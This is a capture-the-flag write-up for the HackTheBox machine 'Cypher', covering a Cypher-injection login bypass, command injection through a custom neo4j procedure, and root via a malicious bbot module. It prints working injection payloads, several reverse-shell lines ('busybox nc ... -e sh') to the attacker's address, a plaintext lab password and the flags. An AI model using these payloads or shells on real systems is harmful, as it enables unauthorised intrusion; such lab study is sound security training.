```json
Alias: Cypher
Date: 06-03_2025
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.10.11.57
```

# Cypher
# Summary

Cypher is a medium difficulty Linux box that requires us to exploit a error-based Cypher-Injection to gain access to a demo panel, where we can use a APOC for neo4j procedure to gain code execution through a command injection. We can then find some credentials used for bbot that also allow us to login to the graphasm user using SSH. The graphasm user can run bbot as root, so we can write a custom python module to take control.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 20:05 PKT
Nmap scan report for 10.10.11.57
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.28 seconds
```
## Discovered Subdomains
```
cypher.htb
```

---

# Enumeration
## JAR File

Performing a directory fuzz on the webserver, we find a directory named `testing` which contains a `JAR` file. We can de-compile this file using procyon

```bash
procyon -o . custom-apoc-extension-1.0-SNAPSHOT.jar
```

This gives us a procedure that can be called from `neo4j` to check a websites status.

```java
final String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

we control the `url` parameter when we call the procedure so this is a command injection. We can call the procedure as such:

```cypher
CALL custom.getUrlStatusCode('http://10.10.14.103:8000/test;busybox nc 10.10.14.103 4444 -e sh')
```

But where do we call it from?

## Login Panel

At `http://cypher.htb/login`, inputting a `'` in the username field throws a giant error at us. From this we can tell that neo4j Cypher is being used at the back-end.

The interesting part of the error:

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'our input' return h.value as hash
```

It seems that it finds a user using the where clause and returns their hash. Since we can escape the single quotes, we can try to log in as such:

```cypher
' or 1=1 RETURN 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' as hash//
```

With this the query becomes:

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' or 1=1 RETURN 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' as hash//' return h.value as hash
```

The hash I gave, is the SHA1 hash of the string `hello` and in the password field we can input the string `hello`. With this when the back-end logic tries to hash the password that we provided and compare it with the SHA1 hash it received from the query, we should be able to log in.

And we do:

![[Pasted image 20250306223927.png]]


---

# Exploitation

We are redirected to the demo page from which we can run any cypher query. So lets try to call the procedure we found in the jar file!

```cypher
CALL custom.getUrlStatusCode('http://10.10.14.103:8000/test;busybox nc 10.10.14.103 4444 -e sh')
```

With this we get a shell as `neo4j`.

---

# Lateral Movement

Navigating to `/home/graphasm`. We find a `bbot_preset.yml` file which contains some credentials, and due to password re-use we can use this credential to login to user `graphasm` using SSH.

---

# Privilege Escalation

Doing a `sudo -l` shows that our user can run bbot as root. So doing a `StartPage` search for bbot we come across this: https://github.com/blacklanternsecurity/bbot. It is a recon tool, which can use custom modules. Following the instructions on this page: https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/, I created a simple custom module to get a reverse shell:

```python
from bbot.modules.base import BaseModule
import os

class mymodule(BaseModule):
    watched_events = ["DNS_NAME"] # watch for DNS_NAME events
    produced_events = ["WHOIS"] # we produce WHOIS events
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""} # module config options
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True # only run once per domain

    base_url = "https://www.whoisxmlapi.com/whoisserver/WhoisService"

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        os.system("busybox nc 10.10.14.103 4444 -e sh");
        return True

    async def handle_event(self, event):
        self.hugesuccess(f"Got {event} (event.data: {event.data})")
        _, domain = self.helpers.split_domain(event.data)
        url = f"{self.base_url}?apiKey={self.api_key}&domainName={domain}&outputFormat=JSON"
        self.hugeinfo(f"Visiting {url}")
        response = await self.helpers.request(url)
        if response is not None:
            await self.emit_event(response.json(), "WHOIS", parent=event)

```

I stored this in `/tmp` and created a preset file for it, which specifies `/tmp` as a directory to load modules from (Make sure the class name and the file name are same).

preset file:

```yml
targets:
  - ecorp.htb

output_dir: /tmp/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

module_dirs:
  - /tmp

```

Start up a listener and run the command:

```bash
sudo /usr/local/bin/bbot -p /tmp/bbot_preset.yml -m mymodule
```

---

# Flags
- 0ef9aed3e6932772444dc86d30cc266d
- d0080b1decd5e38781e5ccda30e62cfc

#CTF